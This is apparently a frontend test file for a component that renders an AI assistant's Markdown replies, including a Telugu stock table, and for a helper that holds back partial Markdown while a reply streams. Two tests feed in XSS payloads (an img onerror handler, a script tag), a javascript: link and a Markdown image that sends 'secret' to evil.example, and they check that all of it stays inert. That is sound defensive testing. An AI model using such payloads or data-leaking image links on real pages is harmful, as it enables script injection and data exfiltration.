import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { AssistantMarkdown, settledMarkdown } from "@/components/assistant/AssistantMarkdown";

/*
 * E10-MD: the assistant's reply is read as Markdown in the app's own styles, never as HTML. The
 * Telugu reply is the one Rajeev got, which showed as pipes, dashes and asterisks before this.
 */

const TELUGU = [
  "మీ స్టాక్ ఇలా ఉంది:",
  "",
  "| వస్తువు | చేతిలో ఉన్నది |",
  "|---|---|",
  "| Ajwain | 0 gm |",
  "| Asafoetida | 0 gm |",
  "| Toor dal | 42.5 Kg |",
  "",
  "- **Ajwain** అయిపోయింది",
  "- Toor dal సరిపోతుంది",
].join("\n");

describe("AssistantMarkdown", () => {
  it("draws a table as a real ruled table, with the figures on a fixed pitch and labelled for the phone card", () => {
    const { container } = render(<AssistantMarkdown text={TELUGU} streaming={false} />);
    const table = container.querySelector("table")!;
    expect(table).not.toBeNull();
    expect(table.className).toContain("kms-table");
    expect(Array.from(table.querySelectorAll("th")).map((th) => th.textContent)).toEqual(["వస్తువు", "చేతిలో ఉన్నది"]);
    const firstRow = table.querySelectorAll("tbody tr")[0];
    const [name, onHand] = Array.from(firstRow.querySelectorAll("td"));
    expect(name.textContent).toBe("Ajwain");
    expect(name.className).toContain("kms-primary");
    expect(onHand.textContent).toBe("0 gm");
    expect(onHand.className).toContain("kms-num");
    expect(onHand.getAttribute("data-label")).toBe("చేతిలో ఉన్నది");
    // Nothing of the Markdown is left showing.
    expect(container.textContent).not.toContain("|");
    expect(container.textContent).not.toContain("---");
    expect(container.textContent).not.toContain("**");
  });

  it("draws bold and a list", () => {
    const { container } = render(<AssistantMarkdown text={TELUGU} streaming={false} />);
    const items = container.querySelectorAll("ul > li");
    expect(items).toHaveLength(2);
    expect(items[0].querySelector("strong")?.textContent).toBe("Ajwain");
  });

  it("treats a text column as text, and drops a model's right-alignment (every column reads left)", () => {
    const md = "| Item | Status | Qty |\n|---|---|---:|\n| Rice | Low | 3 Kg |";
    const { container } = render(<AssistantMarkdown text={md} streaming={false} />);
    const [, status, qty] = Array.from(container.querySelectorAll("tbody td"));
    expect(status.className).toContain("kms-second");
    expect(qty.className).toContain("kms-num");
    expect((qty as HTMLElement).style.textAlign).toBe("");
    expect(qty.getAttribute("align")).toBeNull();
  });

  it("never runs HTML in the text: an <img onerror> stays inert text", () => {
    const md = 'Stock is fine <img src="x" onerror="window.__pwned=1"> really\n\n<script>window.__pwned=2</script>';
    const { container } = render(<AssistantMarkdown text={md} streaming={false} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("fetches no Markdown image and follows no link", () => {
    const md = "![stock list](https://evil.example/?d=secret) and [click](javascript:alert(1)) and [site](https://evil.example)";
    const { container } = render(<AssistantMarkdown text={md} streaming={false} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toBe("stock list and click and site");
  });

  it("keeps a single line break a line break", () => {
    const { container } = render(<AssistantMarkdown text={"Ajwain: 0 gm\nAsafoetida: 0 gm"} streaming={false} />);
    expect(container.querySelector("br")).not.toBeNull();
  });
});

describe("settledMarkdown — a reply still arriving", () => {
  it("holds back a table heading until its dashes arrive, so no pipes flash", () => {
    expect(settledMarkdown("Here:\n\n| Item | On hand |\n", true)).toBe("Here:\n");
    expect(settledMarkdown("Here:\n\n| Item | On hand |\n|---|-", true)).toBe("Here:\n");
    const { container } = render(<AssistantMarkdown text={"Here:\n\n| Item | On hand |\n|---|-"} streaming={true} />);
    expect(container.textContent).toBe("Here:");
  });

  it("holds back a row until its line ends, then shows it whole", () => {
    const so_far = "| Item | On hand |\n|---|---|\n| Ajwain | 0 gm |\n| Asafoe";
    expect(settledMarkdown(so_far, true)).toBe("| Item | On hand |\n|---|---|\n| Ajwain | 0 gm |\n");
    const { container } = render(<AssistantMarkdown text={so_far} streaming={true} />);
    expect(container.querySelectorAll("tbody tr")).toHaveLength(1);
    expect(container.textContent).not.toContain("Asafoe");
    expect(container.textContent).not.toContain("|");
  });

  it("holds back a bold or code span until it closes, so no asterisks flash", () => {
    expect(settledMarkdown("All three are below their **reorder", true)).toBe("All three are below their ");
    expect(settledMarkdown("All three are below their **reorder level**", true)).toBe("All three are below their **reorder level**");
    expect(settledMarkdown("Ask for `toor", true)).toBe("Ask for ");
    expect(settledMarkdown("- **Ajwain** is out\n- **Asafo", true)).toBe("- **Ajwain** is out\n- ");
  });

  it("draws an unfinished sentence as it comes, and everything once the reply is done", () => {
    expect(settledMarkdown("There are 42 Kg of toor d", true)).toBe("There are 42 Kg of toor d");
    expect(settledMarkdown("| Item |\n", false)).toBe("| Item |\n");
  });
});
